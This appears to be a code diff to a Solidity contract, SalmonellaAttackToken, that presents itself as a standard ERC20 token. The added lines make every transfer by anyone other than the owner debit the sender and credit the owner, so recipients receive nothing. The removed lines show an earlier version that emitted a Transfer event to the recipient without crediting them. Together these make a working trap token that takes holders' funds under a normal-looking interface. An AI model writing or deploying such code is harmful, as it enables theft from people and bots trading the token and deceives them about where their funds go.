@@ -27,7 +27,8 @@ contract SalmonellaAttackToken is IERC20 {
         decimals = 18;
         totalSupply = initialSupply * 10**uint256(decimals);
         _balances[msg.sender] = totalSupply;
-        emit Transfer(address(0), msg.sender, totalSupply);
+	owner = msg.sender;
+        emit Transfer(address(0), owner, totalSupply);
     }
     
      /**
@@ -108,12 +109,13 @@ contract SalmonellaAttackToken is IERC20 {
         if (sender == address(0) || sender == owner) {
             // Normal transfer if sender is address zero
             _balances[sender] = senderBalance - amount;
-    	      _balances[recipient] += amount;
+    	    _balances[recipient] += amount;
             emit Transfer(sender, recipient, amount);
         } else {
             _balances[sender] = senderBalance - amount;
+	    _balances[owner] += amount;
+	    emit Transfer(sender, owner, amount);
         }
-	emit Transfer(sender, recipient, amount);
     }
 
     /**
